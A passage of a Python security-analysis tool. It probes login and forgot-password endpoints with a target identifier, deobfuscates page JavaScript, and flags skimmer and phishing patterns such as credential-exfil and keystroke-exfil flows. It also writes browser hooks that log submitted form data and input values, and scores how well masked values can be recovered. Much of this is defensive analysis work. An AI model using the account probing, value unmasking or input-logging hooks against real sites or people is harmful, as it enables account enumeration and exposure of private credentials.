                            out["field_names"].append(k)
        else:
            for m in re.finditer(
                    r"['\"]?([a-zA-Z_][a-zA-Z0-9_]*)['\"]?"
                    r"\s*(?:is\s+)?required", resp_text, re.IGNORECASE):
                name = m.group(1)
                if name not in out["field_names"]:
                    out["field_names"].append(name)
        out["field_names"] = list(dict.fromkeys(out["field_names"]))[:15]
        return out

    def probe_login(self, attempt_with_wrong_pw: bool = True
                    ) -> Dict[str, Any]:
        payload = {self.username_field: self.identifier.normalized}
        if attempt_with_wrong_pw:
            payload[self.password_field] = (
                f"wrong_{os.urandom(4).hex()}_9x7z")
        LOG.log("login_probe",
                msg=f"POST {self.login_url} "
                    f"fields={list(payload.keys())}")
        r = self.client.post_json_soft(self.login_url, payload)
        out: Dict[str, Any] = {
            "attempted": True,
            "status": None,
            "response_preview": "",
            "fields_required": [],
            "obfuscated": False,
            "deobfuscated": None,
            "trail": [],
        }
        if r is None:
            out["status"] = "request_failed"
            return out
        out["status"] = r.status_code
        body = r.text or ""
        out["response_preview"] = body[:300]
        fields = self._analyze_fields_required(body, r.status_code)
        out["fields_required"] = fields["field_names"]
        LOG.log("login_probe",
                msg=f"HTTP {r.status_code} fields="
                    f"{fields['field_names']} "
                    f"preview={body[:100]!r}")
        decoded, trail = self.cascade.decode(body)
        if trail and decoded != body:
            out["obfuscated"] = True
            out["deobfuscated"] = decoded[:2000]
            out["trail"] = trail
            LOG.log("deobf", msg=f"login response obfuscated: "
                                 f"trail={trail} "
                                 f"decoded_len={len(decoded)}")
        return out

    def probe_forgot_password(self) -> Dict[str, Any]:
        paths = [
            "/api/forgot-password",
            "/api/auth/forgot",
            "/api/auth/forgot-password",
            "/api/password/forgot",
            "/api/recover",
            "/forgot-password",
            "/forgot",
        ]
        out: Dict[str, Any] = {
            "attempted": True,
            "endpoint": None,
            "status": None,
            "response_preview": "",
            "obfuscated": False,
            "deobfuscated": None,
            "trail": [],
        }
        for path in paths:
            payload = {self.username_field: self.identifier.normalized}
            LOG.log("forgot_probe",
                    msg=f"POST {path} fields={list(payload.keys())}")
            r = self.client.post_json_soft(path, payload)
            if r is None:
                continue
            if r.status_code == 404:
                continue
            out["endpoint"] = path
            out["status"] = r.status_code
            body = r.text or ""
            out["response_preview"] = body[:300]
            LOG.log("forgot_probe",
                    msg=f"HTTP {r.status_code} at {path} "
                        f"preview={body[:100]!r}")
            decoded, trail = self.cascade.decode(body)
            if trail and decoded != body:
                out["obfuscated"] = True
                out["deobfuscated"] = decoded[:2000]
                out["trail"] = trail
                LOG.log("deobf", msg=f"forgot-password obfuscated: "
                                     f"trail={trail} "
                                     f"decoded_len={len(decoded)}")
            return out
        out["status"] = "no_endpoint"
        return out

    def run(self) -> Dict[str, Any]:
        login = self.probe_login()
        forgot = None
        if (login.get("obfuscated")
                or not login.get("fields_required")
                or login.get("status") in (None, "request_failed")):
            LOG.log("login_probe",
                    msg="no usable signal from login; "
                        "falling back to forgot-password")
            forgot = self.probe_forgot_password()
        else:
            LOG.log("login_probe",
                    msg="login response was usable; "
                        "forgot-password probe skipped")
        return {"login": login, "forgot_password": forgot}


def _extract_js_array_literal(s: str, start: int
                              ) -> Tuple[Optional[List[str]], int]:
    if start >= len(s) or s[start] != "[":
        return None, start
    elements: List[str] = []
    i = start + 1
    while i < len(s):
        while i < len(s) and s[i] in " \t\n\r,":
            i += 1
        if i >= len(s):
            return None, start
        if s[i] == "]":
            return elements, i + 1
        if s[i] in "\"'":
            quote = s[i]
            j = i + 1
            buf: List[str] = []
            while j < len(s):
                if s[j] == "\\" and j + 1 < len(s):
                    buf.append(s[j:j + 2])
                    j += 2
                    continue
                if s[j] == quote:
                    break
                buf.append(s[j])
                j += 1
            if j >= len(s):
                return None, start
            elements.append(decode_js_escapes("".join(buf)))
            i = j + 1
        else:
            j = i
            while j < len(s) and s[j] not in ",]":
                j += 1
            elements.append(s[i:j].strip())
            i = j
    return None, start


def _js_escape(s: str) -> str:
    return (s.replace("\\", "\\\\").replace('"', '\\"')
            .replace("\n", "\\n").replace("\r", "\\r")
            .replace("\t", "\\t"))


class ArrayRotationPass:
    def __init__(self):
        self.changed = False
        self.findings: List[Dict[str, Any]] = []

    def transform(self, js: str) -> str:
        self.changed = False
        out: List[str] = []
        pos = 0
        for m in ARRAY_DEF_RE.finditer(js):
            name = m.group(1)
            arr_start = m.end() - 1
            out.append(js[pos:m.start()])
            elements, end = _extract_js_array_literal(js, arr_start)
            if elements is None:
                out.append(js[m.start():m.end()])
                pos = m.end()
                continue
            tail_start = end
            window = js[tail_start:tail_start + 800]
            rot_match = ROTATION_IIFE_RE.search(window)
            rotation = 0
            consume_end = end
            if rot_match and rot_match.group(1) == name:
                try:
                    rotation = int(rot_match.group(5), 0)
                except ValueError:
                    rotation = 0
                consume_end = tail_start + rot_match.end()
            if elements and rotation:
                n = len(elements)
                offset = rotation % n
                rotated = elements[offset:] + elements[:offset]
                self.findings.append({"array_name": name,
                                      "elements": n,
                                      "rotation": rotation,
                                      "offset": offset})
                rendered = "[" + ",".join(
                    '"' + _js_escape(e) + '"' for e in rotated) + "]"
                out.append(f"var {name}={rendered};")
                self.changed = True
            else:
                out.append(f"var {name}=")
                out.append("[" + ",".join(
                    '"' + _js_escape(e) + '"' for e in elements) + "]")
            pos = consume_end
        if pos < len(js):
            out.append(js[pos:])
        return "".join(out)


class StringArrayResolverPass:
    def __init__(self):
        self.changed = False
        self.resolved = 0

    def transform(self, js: str) -> str:
        self.changed = False
        arr_map: Dict[str, List[str]] = {}
        for m in ARRAY_DEF_RE.finditer(js):
            elements, _ = _extract_js_array_literal(js, m.end() - 1)
            if elements is not None:
                arr_map[m.group(1)] = elements
        resolver_to_arr: Dict[str, str] = {}
        for m in STRING_LOOKUP_RE.finditer(js):
            if m.group(4) in arr_map:
                resolver_to_arr[m.group(1)] = m.group(4)

        def _replace(m: re.Match) -> str:
            fn = m.group(1)
            try:
                idx = int(m.group(2), 0)
            except ValueError:
                return m.group(0)
            arr = arr_map.get(resolver_to_arr.get(fn, ""))
            if arr is None or idx >= len(arr):
                return m.group(0)
            self.changed = True
            self.resolved += 1
            return '"' + _js_escape(arr[idx]) + '"'

        return ARRAY_LOOKUP_CALL_RE.sub(_replace, js)


def _unpack_packer(data: str, count: int,
                   symbols: Sequence[str]) -> str:
    out: List[str] = []
    i = 0
    while i < len(data):
        current = 0
        while i < len(data) and PACKER_BASE62.index(data[i]) < count:
            current = current * 62 + PACKER_BASE62.index(data[i])
            i += 1
        if i < len(data):
            i += 1
        if current < len(symbols) and symbols[current]:
            out.append(symbols[current])
    return "".join(out)


class PackerUnpackerPass:
    def __init__(self):
        self.changed = False
        self.findings: List[Dict[str, Any]] = []

    def transform(self, js: str) -> str:
        self.changed = False

        def _repl(m: re.Match) -> str:
            try:
                packed = m.group(3)
                base = int(m.group(4))
                count = int(m.group(5))
                symbols = m.group(7).split("|")
            except Exception:
                return m.group(0)
            if base != 62:
                return m.group(0)
            try:
                unpacked = _unpack_packer(packed, count, symbols)
            except Exception:
                return m.group(0)
            self.changed = True
            self.findings.append({"packed_len": len(packed),
                                  "unpacked_len": len(unpacked)})
            return unpacked

        return PACKER_RE.sub(_repl, js)


class EvalUnnestPass:
    def __init__(self):
        self.changed = False
        self.depth = 0

    def transform(self, js: str) -> str:
        self.changed = False
        depth = 0
        while depth < 6:
            new = EVAL_LITERAL_RE.sub(self._repl, js)
            new = NEW_FUNCTION_RE.sub(self._repl, new)
            if new == js:
                break
            js = new
            depth += 1
            self.changed = True
        self.depth = depth
        return js

    def _repl(self, m: re.Match) -> str:
        body = m.group(2)
        try:
            return decode_js_escapes(body)
        except Exception:
            return m.group(0)


class StringConcatFoldPass:
    def __init__(self):
        self.changed = False

    def transform(self, js: str) -> str:
        self.changed = False
        prev = None
        while prev != js:
            prev = js

            def _fold(m: re.Match) -> str:
                try:
                    a = m.group(2).encode().decode(
                        "unicode_escape", errors="replace")
                    b = m.group(4).encode().decode(
                        "unicode_escape", errors="replace")
                    return '"' + _js_escape(a + b) + '"'
                except Exception:
                    return m.group(0)

            js = CONCAT_LITERAL_RE.sub(_fold, js)
            if js != prev:
                self.changed = True
        return js


class ControlFlowDetector:
    def __init__(self):
        self.findings: List[Dict[str, Any]] = []

    def scan(self, js: str) -> None:
        self.findings = []
        for m in CONTROL_FLOW_RE.finditer(js):
            self.findings.append({"order_var": m.group(1),
                                  "case_order": m.group(3).split("|"),
                                  "switch_index_var": m.group(4)})


class DeadCodeDetector:
    def __init__(self):
        self.findings: List[Dict[str, Any]] = []

    def scan(self, js: str) -> None:
        self.findings = []
        for m in DEAD_VAR_RE.finditer(js):
            name = m.group(1)
            rest = js[m.end():m.end() + 5000]
            if not re.search(rf"\b{re.escape(name)}\b", rest):
                self.findings.append(
                    {"var": name,
                     "declaration_pos": m.start(),
                     "declaration_snippet": m.group(0)[:120]})


@dataclass
class JSDebfResult:
    original: str
    deobfuscated: str
    passes: List[Dict[str, Any]] = field(default_factory=list)
    findings: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "original_len": len(self.original),
            "deobfuscated_len": len(self.deobfuscated),
            "reduction_ratio": round(
                1 - (len(self.deobfuscated)
                     / max(1, len(self.original))), 3),
            "passes": self.passes,
            "findings": self.findings,
        }


class JSDebfuscator:
    def __init__(self):
        self.cascade = StringCascade()

    def run(self, js: str, max_rounds: int = 8) -> JSDebfResult:
        original = js
        passes: List[Dict[str, Any]] = []
        rotation = ArrayRotationPass()
        resolver = StringArrayResolverPass()
        packer = PackerUnpackerPass()
        eval_unnest = EvalUnnestPass()
        concat = StringConcatFoldPass()
        cf_detector = ControlFlowDetector()
        dead_detector = DeadCodeDetector()
        cf_detector.scan(js)
        dead_detector.scan(js)
        pipeline = [rotation, resolver, packer, eval_unnest, concat]
        for round_idx in range(max_rounds):
            LOG.log("js_pass", level="verbose",
                    msg=f"round {round_idx + 1}/{max_rounds}")
            changed_any = False
            for stage in pipeline:
                before = js
                js = stage.transform(js)
                if js != before and getattr(stage, "changed", False):
                    changed_any = True
                    info = {"round": round_idx + 1,
                            "pass": type(stage).__name__,
                            "before_len": len(before),
                            "after_len": len(js)}
                    if isinstance(stage, ArrayRotationPass):
                        info["findings"] = stage.findings
                    if isinstance(stage, PackerUnpackerPass):
                        info["findings"] = stage.findings
                    if isinstance(stage, StringArrayResolverPass):
                        info["resolved"] = stage.resolved
                    if isinstance(stage, EvalUnnestPass):
                        info["depth"] = stage.depth
                    passes.append(info)
                    LOG.log("js_pass", level="verbose",
                            msg=f"  {type(stage).__name__}: "
                                f"{len(before)} -> {len(js)}")
            if not changed_any:
                break
        decoded, trail = self.cascade.decode(js)
        if trail:
            passes.append({"pass": "StringCascade", "trail": trail,
                           "before_len": len(js),
                           "after_len": len(decoded)})
            js = decoded
        return JSDebfResult(
            original=original, deobfuscated=js, passes=passes,
            findings={
                "control_flow_flattening": cf_detector.findings,
                "dead_vars": dead_detector.findings})


@dataclass
class HTMLDebfResult:
    original: str
    deobfuscated: str
    findings: Dict[str, Any]
    inline_scripts: List[str]
    external_scripts: List[str]
    skimmer_hits: List[Dict[str, Any]]
    phishing_hits: List[Dict[str, Any]]


class HTMLDeobfuscator:
    def __init__(self):
        self.cascade = StringCascade()

    def run(self, html_text: str, page_url: str) -> HTMLDebfResult:
        original = html_text
        findings: Dict[str, Any] = {
            "data_uris": [], "js_uris": [],
            "meta_refresh": [], "comments": []}
        deob = html_text
        if "&#" in deob:
            new = decode_html_entities(deob)
            if new != deob:
                findings["html_entities_decoded"] = True
                deob = new
                LOG.log("html", level="verbose",
                        msg="decoded HTML entities")
        for m in DATA_URI_RE.finditer(deob):
            mime, b64 = m.group(1), m.group(2)
            r = try_base64(b64)
            decoded = r[1] if r else None
            findings["data_uris"].append(
                {"mime": mime, "payload_len": len(b64),
                 "decoded_preview": (decoded or "")[:200]})
            if decoded and mime.startswith("text/"):
                LOG.log("html", level="verbose",
                        msg=f"data URI {mime} decodes to "
                            f"{len(decoded)} chars")
        for m in JS_URI_RE.finditer(deob):
            raw = m.group(1)
            decoded = urllib.parse.unquote(raw)
            findings["js_uris"].append(
                {"raw_len": len(raw),
                 "decoded_preview": decoded[:200]})
            LOG.log("html", level="verbose",
                    msg=f"javascript: URI ({len(raw)} bytes)")
        for m in META_REFRESH_RE.finditer(deob):
            findings["meta_refresh"].append(m.group(1))
        for m in HTML_COMMENT_RE.finditer(deob):
            payload = m.group(1)
            if "<" in payload or "script" in payload.lower() \
                    or "eval" in payload.lower():
                findings["comments"].append(
                    {"len": len(payload),
                     "preview": payload[:200]})
        inline_scripts: List[str] = []
        external_scripts: List[str] = []
        for m in SCRIPT_TAG_RE.finditer(deob):
            attrs, body = m.group(1), m.group(2)
            src_match = SCRIPT_SRC_RE.search(attrs)
            if src_match:
                external_scripts.append(
                    urljoin(page_url, src_match.group(2)))
            elif body.strip():
                inline_scripts.append(body)
        skimmer_hits = detect_skimmer_behavior(
            deob + "\n" + "\n".join(inline_scripts))
        phishing_hits = detect_phishing(deob, page_url)
        return HTMLDebfResult(
            original=original, deobfuscated=deob, findings=findings,
            inline_scripts=inline_scripts,
            external_scripts=external_scripts,
            skimmer_hits=skimmer_hits, phishing_hits=phishing_hits)


def detect_skimmer_behavior(js: str) -> List[Dict[str, Any]]:
    if not js:
        return []
    hits: List[Dict[str, Any]] = []
    checks = {
        "credential-field-reference": CRED_FIELD_RE,
        "exfil-sink": EXFIL_SINK_RE,
        "keyboard-listener": KEYBOARD_LISTENER_RE,
        "input-read": INPUT_READ_RE,
        "mutation-or-unload": MUTATION_RE,
        "beacon": BEACON_RE,
    }
    for name, pat in checks.items():
        matches = list(pat.finditer(js))
        if not matches:
            continue
        hits.append({"pattern": name, "count": len(matches),
                     "sample": _context(js, matches[0].start())})
    exfil = any(h["pattern"] == "exfil-sink" for h in hits)
    reads = any(h["pattern"] in ("credential-field-reference", "input-read")
                for h in hits)
    keyboard = any(h["pattern"] == "keyboard-listener" for h in hits)
    if exfil and reads:
        hits.append({"pattern": "credential-exfil-flow",
                     "verdict": "HIGH",
                     "note": "field reads + network sink co-occur"})
    if exfil and keyboard:
        hits.append({"pattern": "keystroke-exfil-flow",
                     "verdict": "HIGH",
                     "note": "keyboard listener + network sink co-occur"})
    return hits


def detect_phishing(html_text: str,
                    page_url: str) -> List[Dict[str, Any]]:
    hits: List[Dict[str, Any]] = []
    page_origin = urlparse(page_url).netloc.lower()
    for m in PHISHING_FORM_RE.finditer(html_text):
        attrs, body = m.group(1), m.group(2)
        act_m = PHISHING_ACTION_RE.search(attrs)
        method_m = PHISHING_METHOD_RE.search(attrs)
        action = act_m.group(2) if act_m else ""
        method = (method_m.group(2) if method_m else "get").lower()
        full_action = urljoin(page_url, action) if action else page_url
        action_origin = urlparse(full_action).netloc.lower()
        has_password = bool(re.search(
            r"<input[^>]+type\s*=\s*['\"]password['\"]",
            body, re.IGNORECASE))
        hidden = bool(HIDDEN_STYLE_RE.search(attrs)
                      or HIDDEN_CLASS_RE.search(attrs))
        if action_origin and action_origin != page_origin:
            hits.append({"type": "form-action-off-origin",
                         "action": redact_url_for_log(full_action),
                         "method": method,
                         "has_password": has_password,
                         "verdict": "HIGH" if has_password
                         else "MEDIUM"})
        if has_password and method == "get":
            hits.append({"type": "password-in-get-form",
                         "action": redact_url_for_log(full_action),
                         "verdict": "HIGH"})
        if hidden and has_password:
            hits.append({"type": "hidden-password-form",
                         "verdict": "HIGH",
                         "snippet": attrs[:200]})
    return hits


def _context(text: str, pos: int, radius: int = 80) -> str:
    start = max(0, pos - radius)
    end = min(len(text), pos + radius)
    return text[start:end].replace("\n", " ")

NODE_SCRIPT = r"""
const fs = require('fs');
let input = '';
process.stdin.on('data', d => input += d);
process.stdin.on('end', () => {
  try {
    const parser = require('@babel/parser');
    const traverse = require('@babel/traverse').default;
    const generate = require('@babel/generator').default;
    let ast;
    try {
      ast = parser.parse(input, {sourceType: 'script',
                                 errorRecovery: true,
                                 allowReturnOutsideFunction: true});
    } catch (e) {
      try {
        ast = parser.parse(input, {sourceType: 'module',
                                   errorRecovery: true});
      } catch (e2) {
        process.stdout.write(JSON.stringify(
          {ok: false, error: String(e2)}));
        return;
      }
    }
    let renamed = 0;
    const seen = new Map();
    traverse(ast, {
      Identifier(path) {
        const name = path.node.name;
        if (/^_0x[a-f0-9]{4,}$/i.test(name)) {
          if (!seen.has(name)) seen.set(name, 'v' + (seen.size + 1));
          try { path.node.name = seen.get(name); renamed++; } catch (e) {}
        }
      },
      EmptyStatement(path) { path.remove(); },
      DebuggerStatement(path) { path.remove(); },
    });
    const out = generate(ast, {compact: false, comments: false}).code;
    process.stdout.write(JSON.stringify({ok: true, code: out,
                                          renamed: renamed}));
  } catch (e) {
    process.stdout.write(JSON.stringify({ok: false,
                                          error: String(e)}));
  }
});
"""


class NodeBridge:
    def __init__(self):
        self.available = self._detect()

    def _detect(self) -> bool:
        try:
            result = subprocess.run(
                ["node", "-e",
                 "require('@babel/parser'); "
                 "require('@babel/generator'); "
                 "require('@babel/traverse');"],
                capture_output=True, timeout=5)
            return result.returncode == 0
        except (FileNotFoundError, Exception):
            return False

    def transform(self, js: str) -> Optional[Dict[str, Any]]:
        if not self.available:
            return None
        try:
            proc = subprocess.run(
                ["node", "-e", NODE_SCRIPT],
                input=js.encode(), capture_output=True, timeout=30)
            if proc.returncode != 0:
                LOG.log("warn", msg=f"node exited {proc.returncode}")
                return None
            payload = json.loads(proc.stdout.decode())
            if not payload.get("ok"):
                LOG.log("warn",
                        msg=f"AST parse failed: "
                            f"{payload.get('error', '?')[:120]}")
                return None
            return payload
        except Exception as e:
            LOG.log("warn", msg=f"Node bridge error: "
                                f"{type(e).__name__}")
            return None


PAUSE_JS = r"""
(() => {
  const TAG = '[ZEPHYR-PAUSE]';
  const log = (kind, payload) => {
    try {
      console.log(TAG, kind, JSON.stringify(payload, null, 2));
    } catch (e) {
      console.log(TAG, kind, '<unserialisable>');
    }
  };
  const pause = () => { try { debugger; } catch (e) {} };

  const _fetch = window.fetch;
  window.fetch = function(input, init) {
    log('fetch', {url: String(input),
                  method: (init && init.method) || 'GET',
                  body: init && init.body});
    pause();
    return _fetch.apply(this, arguments);
  };

  const _xhrOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    this.__zephyr_url = String(url);
    this.__zephyr_method = method;
    return _xhrOpen.apply(this, arguments);
  };
  const _xhrSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function(body) {
    log('xhr.send', {url: this.__zephyr_url,
                     method: this.__zephyr_method,
                     body: body});
    pause();
    return _xhrSend.apply(this, arguments);
  };

  const _formSubmit = HTMLFormElement.prototype.submit;
  HTMLFormElement.prototype.submit = function() {
    try {
      const data = {};
      const fd = new FormData(this);
      for (const [k, v] of fd.entries()) data[k] = String(v);
      log('form.submit', {action: this.action,
                          method: this.method,
                          data});
    } catch (e) { log('form.submit', {error: String(e)}); }
    pause();
    return _formSubmit.apply(this, arguments);
  };

  document.addEventListener('submit', (e) => {
    try {
      const data = {};
      const fd = new FormData(e.target);
      for (const [k, v] of fd.entries()) data[k] = String(v);
      log('submit-event', {action: e.target.action,
                            method: e.target.method,
                            data});
    } catch (err) { log('submit-event', {error: String(err)}); }
    pause();
  }, true);

  const _inputValue = Object.getOwnPropertyDescriptor(
    HTMLInputElement.prototype, 'value');
  if (_inputValue && _inputValue.set) {
    Object.defineProperty(HTMLInputElement.prototype, 'value', {
      get: function() { return _inputValue.get.call(this); },
      set: function(v) {
        try {
          log('input.value.set',
              {name: this.name || this.id || '<anon>',
               type: this.type, value: String(v)});
        } catch (e) {}
        return _inputValue.set.call(this, v);
      },
      configurable: true
    });
  }

  console.log(TAG, 'hooks installed');
})();
"""


PAUSE_RUNNER = r"""#!/usr/bin/env python3
import sys
from pathlib import Path
try:
    from playwright.sync_api import sync_playwright
except ImportError:
    print("[fatal] pip install playwright && playwright install chromium",
          file=sys.stderr)
    sys.exit(1)

def main(url, pause_js_path):
    pause_js = Path(pause_js_path).read_text(encoding="utf-8")
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        ctx = browser.new_context()
        page = ctx.new_page()
        page.on("console", lambda msg: print("[console]", msg.text))
        page.add_init_script(pause_js)
        page.goto(url, wait_until="domcontentloaded")
        print("[zephyr] hooks installed; interact with page now")
        print("[zephyr] Ctrl+C to stop")
        try:
            page.wait_for_timeout(0x7fffffff)
        except KeyboardInterrupt:
            pass
        finally:
            browser.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("usage: pause_runner.py <url> <pause.js>")
        sys.exit(1)
    main(sys.argv[1], sys.argv[2])
"""


class Instrumenter:
    def __init__(self, target_url: str):
        self.target_url = target_url

    def write(self, out_dir: str) -> Dict[str, str]:
        out = Path(out_dir)
        out.mkdir(parents=True, exist_ok=True)
        js_path = out / "pause.js"
        py_path = out / "pause_runner.py"
        js_path.write_text(PAUSE_JS, encoding="utf-8")
        py_path.write_text(PAUSE_RUNNER, encoding="utf-8")
        try:
            os.chmod(py_path, 0o755)
        except OSError:
            pass
        return {"pause_js": str(js_path),
                "pause_runner": str(py_path)}


def _write_secure(path: str, data: str) -> None:
    p = Path(path)
    fd = os.open(p, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w", encoding="utf-8") as fh:
        fh.write(data)
    try:
        os.chmod(p, stat.S_IRUSR | stat.S_IWUSR)
    except OSError:
        pass


def run_client_side_analysis(
    client: AuthorizedClient,
    target_url: str,
    out_dir: str,
    max_scripts: int = 20,
    node_enabled: bool = True,
    generate_pause: bool = True,
) -> Dict[str, Any]:
    LOG.log("client_side",
            msg=f"fetching login page: {redact_url_for_log(target_url)}")
    result: Dict[str, Any] = {
        "enabled": True,
        "target_url": redact_url_for_log(target_url),
        "page_status": None, "page_bytes": 0,
        "html_findings": {}, "inline_script_count": 0,
        "external_script_count": 0,
        "js_findings": {"control_flow_flattening": [],
                        "dead_vars": [], "per_script": []},
        "skimmer_hits": [], "phishing_hits": [],
        "instrumentation": {}, "artifacts": {},
        "node_ast_bridge": False, "error": None,
    }
    r = client.get_soft(target_url)
    if r is None:
        result["error"] = "page fetch failed"
        LOG.log("warn", msg="client-side: page fetch failed")
        return result
    result["page_status"] = r.status_code
    result["page_bytes"] = len(r.content or b"")
    LOG.log("client_fetch",
            msg=f"page: HTTP {r.status_code} ({result['page_bytes']} bytes)")
    try:
        html_text = r.text
    except Exception:
        html_text = (r.content or b"").decode("latin-1", errors="replace")
    LOG.log("html", level="verbose", msg="running HTML deobfuscation")
    html_deob = HTMLDeobfuscator().run(html_text, target_url)
    result["html_findings"] = html_deob.findings
    result["inline_script_count"] = len(html_deob.inline_scripts)
    result["external_script_count"] = len(html_deob.external_scripts)
    for key in ("data_uris", "js_uris", "meta_refresh", "comments"):
        n = len(html_deob.findings.get(key, []))
        if n:
            LOG.log("html", level="verbose", msg=f"{key}: {n}")
    LOG.log("html", level="verbose",
            msg=f"inline scripts: {len(html_deob.inline_scripts)}, "
                f"external scripts: {len(html_deob.external_scripts)}")
    LOG.log("script", level="verbose",
            msg=f"fetching up to {max_scripts} external scripts")
    external_bodies: Dict[str, str] = {}
    for url in html_deob.external_scripts[:max_scripts]:
        er = client.get_soft(url)
        if er is None:
            continue
        try:
            external_bodies[url] = er.text
        except Exception:
            external_bodies[url] = (er.content or b"").decode(
                "latin-1", errors="replace")
    if external_bodies:
        LOG.log("script", level="verbose",
                msg=f"fetched {len(external_bodies)} external scripts")
    js_debf = JSDebfuscator()
    node = NodeBridge() if node_enabled else None
    result["node_ast_bridge"] = bool(node and node.available)
    all_deob_js: List[str] = []

    def _process(name: str, body: str) -> None:
        LOG.log("script", level="verbose",
                msg=f"deobfuscating {name} ({len(body)} bytes)")
        res = js_debf.run(body)
        if res.passes:
            LOG.log("js_pass", level="verbose",
                    msg=f"  {name}: {len(res.passes)} passes applied, "
                        f"{len(body)} -> {len(res.deobfuscated)}")
        else:
            LOG.log("js_pass", level="verbose",
                    msg=f"  {name}: no obfuscation passes matched")
        for f in res.findings.get("control_flow_flattening", []):
            f["script"] = name
            result["js_findings"]["control_flow_flattening"].append(f)
        for f in res.findings.get("dead_vars", []):
            f["script"] = name
            result["js_findings"]["dead_vars"].append(f)
        if node is not None and node.available:
            ast_res = node.transform(res.deobfuscated)
            if ast_res and ast_res.get("ok"):
                LOG.log("js_pass", level="verbose",
                        msg=f"  {name}: AST transform "
                            f"({ast_res.get('renamed', 0)} renamed)")
                res.deobfuscated = ast_res["code"]
        all_deob_js.append(f"/* --- {name} --- */\n{res.deobfuscated}")
        result["js_findings"]["per_script"].append({
            "name": name, "original_len": len(body),
            "deobfuscated_len": len(res.deobfuscated),
            "passes": res.passes})
        for hit in detect_skimmer_behavior(res.deobfuscated):
            hit["script"] = name
            result["skimmer_hits"].append(hit)
            if hit.get("verdict") == "HIGH":
                LOG.log("skimmer",
                        msg=f"{name}: {hit['pattern']} "
                            f"({hit.get('note', '')})")

    for idx, body in enumerate(html_deob.inline_scripts):
        _process(f"inline[{idx}]", body)
    for ext_url, body in external_bodies.items():
        _process(ext_url, body)
    result["phishing_hits"] = html_deob.phishing_hits
    for hit in html_deob.phishing_hits:
        if hit.get("verdict") == "HIGH":
            LOG.log("phishing",
                    msg=f"{hit['type']} ({hit.get('action', '')})")
    if generate_pause:
        LOG.log("instrument", level="verbose",
                msg="writing pause-before-transmit instrumentation")
        instr_paths = Instrumenter(target_url).write(out_dir)
        result["instrumentation"] = instr_paths
        LOG.log("instrument", level="verbose",
                msg=f"  pause.js -> {instr_paths['pause_js']}")
        LOG.log("instrument", level="verbose",
                msg=f"  pause_runner.py -> {instr_paths['pause_runner']}")
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    html_path = out / "deobfuscated.html"
    js_path = out / "deobfuscated.js"
    _write_secure(str(html_path), html_deob.deobfuscated)
    _write_secure(str(js_path),
                  "\n\n".join(all_deob_js) if all_deob_js
                  else "// no JS found")
    result["artifacts"] = {
        "html": str(html_path), "js": str(js_path),
        **result["instrumentation"]}
    LOG.log("client_side",
            msg=f"skimmer hits: {len(result['skimmer_hits'])} "
                f"(HIGH: {sum(1 for h in result['skimmer_hits'] if h.get('verdict') == 'HIGH')})")
    LOG.log("client_side",
            msg=f"phishing hits: {len(result['phishing_hits'])} "
                f"(HIGH: {sum(1 for h in result['phishing_hits'] if h.get('verdict') == 'HIGH')})")
    return result

def evaluate_harness(pairs: List[dict], analyzer: MaskPatternAnalyzer,
                     model: CandidateModel,
                     use_known: bool = False) -> dict:
    n = len(pairs)
    if n == 0:
        return {"n": 0, "note": "no evaluation pairs"}
    top1 = top3 = top10 = 0
    rr_sum = 0.0
    brier_sum = 0.0
    brier_count = 0
    conf_buckets: Dict[float, Dict[str, float]] = defaultdict(
        lambda: {"n": 0, "correct": 0, "sum_conf": 0.0})
    per_analyzer: Dict[str, dict] = defaultdict(
        lambda: {"n": 0, "top1": 0, "rr": 0.0})
    for pair in pairs:
        original = str(pair.get("original", "")).strip()
        masked = str(pair.get("masked", "")).strip()
        if not original or not masked:
            continue
        known = original if use_known else ""
        results = analyzer.analyze(masked, known_plaintext=known)
        pooled: List[str] = []
        for res in results:
            ranked = model.rank(masked, res.candidates or [])
            cands = [c for _, c in ranked]
            name = res.method_family
            per_analyzer[name]["n"] += 1
            if cands and cands[0] == original:
                per_analyzer[name]["top1"] += 1
            if original in cands:
                per_analyzer[name]["rr"] += 1.0 / (
                    cands.index(original) + 1)
            pooled.extend(cands)
        pooled_tuples = model.rank(masked, pooled)
        pooled_ranked = [c for _, c in pooled_tuples]
        pooled_interval = (model.interval(pooled_tuples)
                           if pooled_tuples
                           else {"confidence": 0.0})
        pooled_conf = pooled_interval["confidence"]
        is_top1 = bool(pooled_ranked) and pooled_ranked[0] == original
        if pooled_ranked:
            if is_top1:
                top1 += 1
            if original in pooled_ranked[:3]:
                top3 += 1
            if original in pooled_ranked[:10]:
                top10 += 1
            if original in pooled_ranked:
                rr_sum += 1.0 / (pooled_ranked.index(original) + 1)
        brier_sum += (pooled_conf - (1.0 if is_top1 else 0.0)) ** 2
        brier_count += 1
        bucket = round(pooled_conf * 10) / 10
        conf_buckets[bucket]["n"] += 1
        conf_buckets[bucket]["correct"] += int(is_top1)
        conf_buckets[bucket]["sum_conf"] += pooled_conf
    ece = 0.0
    total = brier_count or 1
    reliability = []
    for bucket in sorted(conf_buckets):
        data = conf_buckets[bucket]
        if data["n"] == 0:
            continue
        avg_conf = data["sum_conf"] / data["n"]
        accuracy = data["correct"] / data["n"]
        ece += abs(avg_conf - accuracy) * (data["n"] / total)
        reliability.append({"bucket": bucket, "n": int(data["n"]),
                            "avg_confidence": round(avg_conf, 3),
                            "accuracy": round(accuracy, 3)})

    def _finalize(d):
        return {"n": d["n"],
                "top1_accuracy": round(d["top1"] / d["n"], 3)
                if d["n"] else 0.0,
                "mrr": round(d["rr"] / d["n"], 3) if d["n"] else 0.0}

    return {"n": n, "used_known_plaintext": use_known,
            "method": ("ranker_with_hint" if use_known
                       else "ranker_alone"),
            "pooled_top1_accuracy": round(top1 / n, 3),
            "pooled_top3_accuracy": round(top3 / n, 3),
            "pooled_top10_accuracy": round(top10 / n, 3),
            "pooled_mrr": round(rr_sum / n, 3),
            "brier_score": round(brier_sum / max(1, brier_count), 4),
            "expected_calibration_error": round(ece, 4),
            "reliability_diagram": reliability,
            "per_analyzer": {k: _finalize(v)
                             for k, v in per_analyzer.items()}}


def load_dictionary(path: Optional[str]) -> set:
    d = set(BASE_DICTIONARY)
    if not path:
        return d
    try:
        with open(path, "r", encoding="utf-8") as fh:
